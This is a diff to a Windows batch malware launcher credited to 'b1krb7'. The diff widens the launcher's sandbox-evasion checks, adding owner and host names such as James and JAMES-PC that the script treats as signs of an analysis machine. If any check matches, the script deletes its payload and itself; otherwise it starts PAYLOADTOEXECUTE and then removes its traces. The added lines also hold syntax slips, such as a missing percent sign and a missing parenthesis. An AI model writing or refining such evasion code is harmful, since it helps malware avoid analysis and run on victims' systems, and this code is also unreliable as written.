@@ -2,8 +2,12 @@
 owner1="Registered Owner:                 admin"
 owner2="Registered Owner:                 Windows User"
 owner3="Registered Owner:                 John"
+owner31="Registered Owner:                 john"
+owner4="Registered Owner:                 James"
+owner41="Registered Owner:                 john"
 host1="Host Name:                 USER-PC"
 host2="Host Name:                 JOHN-PC"
+host3="Host Name:                 JAMES-PC"
 
 REM # Authered by b1krb7
 REM -----------------------------------------------------------------------------------
@@ -67,10 +71,14 @@ REM -------------------------------
 				            del PAYLOAD.zip.exe
                     			    del checkV.bat
 			        ) else (
-				            systeminfo | findstr "Owner:" > own.log			
-				            set /p own= < own.log
-				            del own.log
-		  ))
+						if "%name%"=="%host3%"
+							del PAYLOAD.zip.exe
+							del checkV.bat
+					) else (
+						            systeminfo | findstr "Owner:" > own.log			
+						            set /p own= < own.log
+						            del own.log
+		  )))
 	
   
 REM -------------------------------
@@ -89,10 +97,22 @@ REM -------------------------------
 					                 del PAYLOAD.zip.exe
                            				 del checkV.bat
 				    ) else (
-					          start PAYLOADTOEXECUTE
-                    				  timeout 2
-                    				  del PAYLOADTOEXECUTE
-                    				  del checkV.bat
-		        )))
+				    		if "%own%"=="%owner31" (
+							del PAYLOAD.zip.exe
+							del checkV.bat
+					) else (
+							if "%own%"=="%owner4%" (
+								del PAYLOAD.zip.exe
+								del checkV.bat
+						) else (
+								if "%own%"=="%owner41%" (
+									del PAYLOAD.zip.exe
+									del checkV.bat
+							) else (
+					          			start PAYLOADTOEXECUTE
+                    				  			timeout 2
+                    				  			del PAYLOADTOEXECUTE
+                    				  			del checkV.bat
+		        ))))))
 	    )
 )
